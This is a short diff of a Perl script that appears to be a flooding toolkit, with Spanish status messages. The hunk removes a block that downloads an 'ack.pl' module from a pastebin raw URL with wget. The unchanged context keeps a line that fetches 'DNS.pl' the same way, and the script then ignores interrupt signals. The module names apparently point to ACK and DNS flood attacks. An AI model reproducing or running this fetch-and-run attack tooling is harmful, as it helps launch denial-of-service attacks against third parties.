@@ -49,10 +49,6 @@ unless (-e "DNS.pl") {
   system("wget https://pastebin.com/raw/ZEeaYZRg -O DNS.pl");
 }
 
-unless (-e "ack.pl") { 
-  print "[*] Instalando ACK... ";
-  system("wget https://pastebin.com/raw/57pBN7Un -O ack.pl");
-}
 all();
 sub all {
 $SIG{'INT'}  = 'IGNORE';
